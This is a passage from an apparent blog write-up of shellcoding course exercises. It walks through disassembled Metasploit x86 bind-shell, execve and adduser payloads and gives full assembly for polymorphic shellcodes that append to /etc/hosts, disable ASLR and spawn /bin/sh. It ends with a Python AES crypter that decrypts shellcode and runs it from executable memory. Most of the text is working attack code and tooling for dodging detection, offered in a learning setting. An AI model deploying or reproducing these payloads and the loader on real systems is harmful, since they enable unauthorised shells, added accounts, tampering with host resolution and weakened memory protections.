00000035  682F2F6269        push dword 0x69622f2f	; pushing //bin/sh onto the stack (backwards)
0000003A  89E3              mov ebx,esp 			; move the pointer to //bin/sh into ebx
0000003C  52                push edx 				; push another NULL
0000003D  53                push ebx 				; push the address of //bin/sh onto the stack
0000003E  89E1              mov ecx,esp 			; move the arguments into ecx
00000040  B00B              mov al,0xb 				; pass in the execve syscall number
00000042  CD80              int 0x80 				; call execve
```
There's nothing exceptionally different about how msf's shellcodes work, but they're clearly more well optimized than my reverse shell was.

Next up, a non-staged bind shell.


#### shell_bind_tcp
```
$ msfvenom -p linux/x86/shell_bind_tcp LHOST=192.168.1.1 LPORT=4444 -f raw | ndisasm -u -
/var/lib/gems/2.5.0/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 78 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  680200115C        push dword 0x5c110002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```
Coming in at 78 bytes, this one has mine beat by.. oh, 30 bytes or so? RIP me.

Starting from the top, we find that the initial call for `socketcall()`, calling `socket()`, is identical to the reverse shell we just looked at.

```
00000000  31DB              xor ebx,ebx 		
00000002  F7E3              mul ebx 			
00000004  53                push ebx 			
00000005  43                inc ebx 			
00000006  53                push ebx 			
00000007  6A02              push byte +0x2  	
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
```
Moving on, we see our `bind()` code:
```
0000000F  5B                pop ebx 				; pop 0x02 into ebx for bind()
00000010  5E                pop esi 				; pop 0x01 into esi for later
00000011  52                push edx 				; start our sockaddr struct by pushing NULL onto the stack 
00000012  680200115C        push dword 0x5c110002 	; push our port (5c11 = 4444) and AF_INET (0x02) onto the stack
00000017  6A10              push byte +0x10 		; push the size of the sockaddr struct
00000019  51                push ecx 				; push the sockaddr struct address (clever stack manipulations, initially set in connect!)
0000001A  50                push eax 				; push the socket file descriptor returned from socket()
0000001B  89E1              mov ecx,esp 			; move the address of arguments into ecx
0000001D  6A66              push byte +0x66 		; 
0000001F  58                pop eax 				; push / pop is less bytes than mov
00000020  CD80              int 0x80 				; call bind()
```

This one struck me, the instructions at 0x00000019 blew my mind at first, but after stepping through it made total sense. This instruction is intended to put the pointer of the address of sockaddr onto the stack-- now looking at it, it's just pushing ecx on... Well as it turns out, ecx actuall still points to the correct address from when it was set in `socket()` initially! Some clever stack play lets us simply reuse the register without modification. That's pretty slick!

Next, we go to `listen()`, 0x04:
```
00000022  894104            mov [ecx+0x4],eax 	; ecx is esp, add a null to esp + 4
00000025  B304              mov bl,0x4 			; move 0x4 (listen) into bl
00000027  B066              mov al,0x66 		; move socketcall into eax
00000029  CD80              int 0x80 			; call socketcall()
```

For the `listen()` function, a small stack manipulation is made in 0x00000022, simply to pass a null byte in as the 'backlog' parameter. ESP already points to the socket file descriptor, so we're good to go, otherwise!

Next up, a simple `accept()` call:
```
0000002B  43                inc ebx 		; increase ebx to 0x5 (accept)
0000002C  B066              mov al,0x66 	; 
0000002E  CD80              int 0x80 		; call socketcall!
```

After calling accept, we move to the last two functions, our dup2 loop, which is the same, highly optimized code we saw in the reverse shell and lastly, calling the shell itself, which is also the same code from the reverse shell.
```
00000030  93                xchg eax,ebx 			; save the file descriptor from accept()
00000031  59                pop ecx 				; pop the initial FD from socket (pushed to the stack @ 0000001A)
00000032  6A3F              push byte +0x3f 		; start the dup2 loop
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32 				; dup2 loop ends
0000003A  682F2F7368        push dword 0x68732f2f 	; execve starts
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80 				;  call execve!
```

Looking at the bind and the reverse shells, after a bit of getting this under my belt, it makes sense that there would be so much code reuse. The shellcodes once seemed so mysterious, but now I can see their immense similarities. 

#### adduser

Rather than walk through some semi-similar staged shells, I wanted to take a quick glance at how msf handles adding a user via shellcode. 
```
$ msfvenom -p linux/x86/adduser -f raw | ndisasm -u -
/var/lib/gems/2.5.0/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes

00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E828000000        call 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80
```
Following a similar protocol to previous, we'll break each section down by syscall.

The first syscall is for `setgid()` (0x46)
```
00000000  31C9              xor ecx,ecx 		; zero out ecx
00000002  89CB              mov ebx,ecx 		; zero out ebx
00000004  6A46              push byte +0x46 	; push 0x46 onto the stack
00000006  58                pop eax 			; pop it into eax
00000007  CD80              int 0x80 			; call setgid
```
After setgid, we see the following:
```
00000009  6A05              push byte +0x5 			; push 0x5 onto the stack
0000000B  58                pop eax 				; pop that value into eax for open() syscall
0000000C  31C9              xor ecx,ecx 			; zero out ecx
0000000E  51                push ecx 				; push a zero onto the stack
0000000F  6873737764        push dword 0x64777373 	; 
00000014  682F2F7061        push dword 0x61702f2f 	;
00000019  682F657463        push dword 0x6374652f 	; push /etc//passwd onto the stack
0000001E  89E3              mov ebx,esp 			; move the pointer to /etc//passwd into ebx
00000020  41                inc ecx 				; increase ecx to 0x1
00000021  B504              mov ch,0x4 				; move 0x4 into the upper bit of the lowest ECX register, creating 0x401 (write and O_NOCTTY flag)
00000023  CD80              int 0x80 				; call open()
```

Next, if you look at the shellcode and think wtf, you're not wrong. After a quick xchg and a call, this section is a jumble as it's actually ascii we're looking at, not legitimate instructions. 
```
00000025  93                xchg eax,ebx 	; xchg the file descriptor that open() returned
00000026  E828000000        call 0x53 		; call 0x53, and skip all the junk
```
So, we xchg the file descriptor and call the next part of the legit payload, starting at offset 53. Our shellcode looks a little jumbled though, and we can't get an accurate disassembly moving forward without going at it by hand. But, ndisasm has a -k option which allows us to disassemble from an offset. We can use that here:

```
$ msfvenom -p linux/x86/adduser -f raw | ndisasm -u -k 43,40 -
/var/lib/gems/2.5.0/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes

00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E828000000        call 0x53
0000002B  skipping 0x28 bytes
00000053  59                pop ecx
00000054  8B51FC            mov edx,[ecx-0x4]
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80
```
That's much cleaner! Starting from 0x00000053, the syscall for write, with the associated arguments (count, pointer to characters and the file descriptor from `open()` )
```
00000053  59                pop ecx 			; pop the location of the string into ecx (call leaves it on the stack!)
00000054  8B51FC            mov edx,[ecx-0x4]	; store the string's length into edx
00000057  6A04              push byte +0x4 		; 
00000059  58                pop eax 			; pop 0x4 (write) into eax
0000005A  CD80              int 0x80 			; call write()
```

Lastly, we call sys_exit with a push, pop.
```
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80
```

### Task 6: Polymorphic

The first shellcode I chose for this assignment was a shellcode which adds a value to an /etc/hosts file (found here http://shell-storm.org/shellcode/files/shellcode-893.php). I like the idea here, as it's a little out of the normal shellcode tactic. It's not 'covert' but it certainly isn't spawning /bin/bash :shrug The original shellcode is 77 bytes, so it's not huge, specially considering the size is going to be based on the value you add to the hosts file. 

After modification, the shellcode now sits at 80 bytes. Three bytes were added to the assembly, but the meat of the shellcode has been rewritten with equivalent instructions-- I was even able to add some kewl math. Here it is:

```
global _start
section .text
_start:

    xor ecx, ecx
    mul ecx

    push eax
    mov al, 0x4     ; Mod

    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp

    inc ecx     	; Mod
    push ecx    	; Mod
    pop edi     	; Mod
    mov ch, al  	; Mod
    inc eax     	; Mod

    int 0x80        ;syscall to open file

    mov ebx, eax    ; Mod
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    
    mov dl, len     ; Mod

    int 0x80        ;syscall to write in the file

    sub edx, 0xE    ; Mod (this needs to be changed based on the length of 'google' as it's subtracting to 6. Perhaps use a div and do the modulus?)
    mov eax, edx    ; Mod

    int 0x80        ;syscall to close the file

    mov eax, edi    ; Mod
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
    len: equ $-google ; Mod
```



http://shell-storm.org/shellcode/files/shellcode-813.php

My second choice for shellcodes was one intended to disable ASLR by rewriting the contents of /proc/sys/kernel/randomize_va_space. Again, this piqued my interest due to it not being quite as 'common'. The original shellcode came in at 83 bytes, mine's a bit bulkier coming in at 91 bytes, but it's core is completely different. It may not be the most efficient, but I thought the changes were pretty clever, every section except exit() has been pretty heavily modified.

```
global _start

section .text
_start:

        xor  eax,eax

        push eax
        push 0x65636170
        push 0x735f6176
        push 0x5f657a69
        push 0x6d6f646e
        push 0x61722f6c
        push 0x656e7265
        push 0x6b2f7379
        push 0x732f636f
        push 0x72702f2f

        mov ebx,esp

        mov eax, 0x2
        mov ch, al
        mov cl, 0xbc
        imul eax, 0x4
        int 0x80

        mov  ebx,eax
        push eax
        push 0x30
        pop edx
        mov dh, 0x3a 
        push dx
        mov ecx,esp
        xor edx,edx
        mov dl, 0x2
        mov al, 0x2
        mul dl
        dec edx
        int 0x80

        add al, 0x5
        int 0x80

        inc eax
        int 0x80
```

For an 8 byte increase, I'd say that's a pretty nice change.


http://shell-storm.org/shellcode/files/shellcode-811.php

Lastly, I decided to try my hand at taking an optimized shellcode and seeing if I could modify it enough for me to feel as though I actually DID something to it, without inflating it's size too much. I was pleasantly surprised that my modifications actually kept it the same size, 28 bytes, but I changed the majority of what was actually able to be modified-- in reality there's not much you can really do with the '//bin/sh'.
```
$ cat execve-poly.nasm 
global _start

section .text

_start:

        xor eax, eax
        xor ecx, ecx
        xor edx, edx
        push eax

        push 0x68732f2f
        push 0x6e69622f

        mov ebx,esp
        push 0xb
        pop eax
        int 0x80

        xchg edx, eax
        inc eax
        int 0x80
```

I've had a lot of fun with these tasks, but so far task four and six have been the most fun. These two have required creativity, which is something that really allows us to flex our capabilities and learn new techniques. I was pretty proud of the little byte manipulations I managed to plug in here and there. Perhaps simplistic, but isn't that the name of the game?

### Task 7: Shellcode Crypter

Task 7 was... interesting. By far the most time spent headbanging (to metal and against metal), while also sporting the biggest facepalm.

My original plan did end up being the outcome, although it took a detour and ended up at the same result. For this task I decided to go the AES CBC route-- it's a common and easily implemented encryption scheme. Using this article, https://www.novixys.com/blog/using-aes-encryption-decryption-python-pycrypto/ , I was able to come up with a PoC encryption / decryption scheme pretty quickly. I even fixed the padding issue before it even became a problem. I suppose 'fixed' should say 'anticipated', which is cool. The encryption and decryption took very little time, but the script itself was pretty lame-- the shellcode was hardcoded within it, it didn't spit things out in cool formats and there was a single argument, just for the key.

Not liking boring things, I spent the next while (read: loooong time) fighting with the way python3 handles \x90 hex notation from the CLI. Storing a \x notated hex byte as a well, byte, that's stored in a variable with the type() of 'string' is a lot harder than I anticipated. I got it figured out with some help eventually, but alas the problems continued. Once I had my fiftieth cheeky encoding fix, I felt like I was pretty much done. I found some of the common techniques for executing shellcode from python and... none of them worked. It took a while to figure out what was happening. Mostly because the scripts did, sorta nothing at all once they got to the 'executing shellcode' part. That was a bummer. 

I suspected memory protections might be at play, as my original shellcodes matched my encrypted / decrypted ones. I found a comment that alluded to modern python versions putting the values used in ctype into areas of memory that CAN'T be munprotected, so I moved back from my Kali 2020 box to an older ubuntu VM. Installed the script's prerequisites and ran it in python 2.7. 

And obviously, it worked. I was relieved but also a little frustrated. The lack of output from the script when running in kali was a little annoying-- I'm not sure how to ascertain the root cause, so it's just more to look into. Honestly, I'm still pretty stoked on the script-- it's overall utility is pretty neat and I learned a lot about the process involved, I probably learned the most about python3 encodings though :shrug

The below is written in python3 and does a lot of stuff that's just not really necessary in py2.7. Everything works in 2.7 and everything BUT the execution works in python 3 on Kali 2020.

```python
#!/usr/bin/env python

# AES Shellcode Encrypter / Decrypter

# PyCrypto
from Crypto.Cipher import AES
import ctypes
import mmap
import sys, os, argparse, base64


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--shellcode", help="Shellcode in \\x90 format", type=str, required=True)
parser.add_argument("-k", "--key", help="The AES key", type=str, required=True)
parser.add_argument("-d", help="Base64'd, AES CBC encrypted shellcode", action="store_true")
parser.add_argument("-e", help="Encrypt shellcode with AES CBC", action="store_true")
args = parser.parse_args()

# First check the args
if len(sys.argv) < 3:
    print("[!] Not enough arguments, exiting.")
    sys.exit()

# Check the shellcode length and pad it if necessary
def padShellcode(shellcode):
    pl = 16 - (len(shellcode) % 16)

    if (pl >= 1 or pl != 16):
        print("[!] Shellcode is %s bytes, %s bytes of padding are needed for AES CBC encryption" % (len(shellcode), pl))
        paddedShellcode = bytearray(b'\x90' * pl + shellcode)
    else: 
        print("[+] Shellcode is a multiple of 16, no padding is required! Length: %s" % len(shellcode))
    return paddedShellcode

def encrypt(key, data):
    iv = os.urandom(16)
    aes = AES.new(key, AES.MODE_CBC, iv)
    return iv + aes.encrypt(bytes(data))

def decrypt(key, cipherText):
    iv = cipherText[:AES.block_size]
    aes = AES.new(key, AES.MODE_CBC, iv)
    decoded = aes.decrypt(cipherText)
    return decoded[AES.block_size:]

def normalize(s):
    normalized = ""
    for byte in bytearray(s):
         normalized += '\\x%02x' % (byte)
    return normalized

def py3ShellcodeFix(s):
    # get the string and split on the \x characters
    code = s.split('\\x')
    # remove any blank strings that may appear (you might also be able to get away with just doing code[1:] instead)
    code = list(filter(lambda x: x != '', code))
    # for each base 16 "character", convert it into a list of integers, then convert all that into a bytearray
    return bytearray([int(x, 16) for x in code])

# Will NOT work in python3 / newer machines
def runShellcode(shellcode):
    # Allocate memory with a RWX private anonymous mmap
    exec_mem = mmap.mmap(-1, len(shellcode),
                         prot = mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                         flags = mmap.MAP_ANONYMOUS | mmap.MAP_PRIVATE)

    # Copy shellcode from bytes object to executable memory
    exec_mem.write(shellcode)

    # Cast the memory to a C function object
    ctypes_buffer = ctypes.c_int.from_buffer(exec_mem)
    function = ctypes.CFUNCTYPE( ctypes.c_int64 )(ctypes.addressof(ctypes_buffer))
    function._avoid_gc_for_mmap = exec_mem

    # Return pointer to shell code function in executable memory
    return function

if args.e:    
    shellcode = py3ShellcodeFix(args.shellcode)
    paddedShellcode = padShellcode(shellcode)
    #print(paddedShellcode)
    encryptedShellcode = encrypt(args.key, paddedShellcode)
    n = normalize(encryptedShellcode)
    print("[+] Encrypted shellcode (raw):\n%s\n" % encryptedShellcode)
    print("[+] Encrypted shellcode (\\x):\n%s\n" % n)
    print("[+] Encrypted shellcode (base64):\n%s\n" % base64.b64encode(encryptedShellcode))

if args.d:
    shellcode = py3ShellcodeFix(args.shellcode)
    decrypted = decrypt(args.key, bytes(shellcode))
    n = normalize(decrypted)
    print("[+] Decrypted shellcode (raw):\n%s\n" % decrypted)
    print("[+] Decrypted shellcode (\\x):\n%s" % n)
    print("[*] Executing shellcode...")
    runShellcode(decrypted)()
```
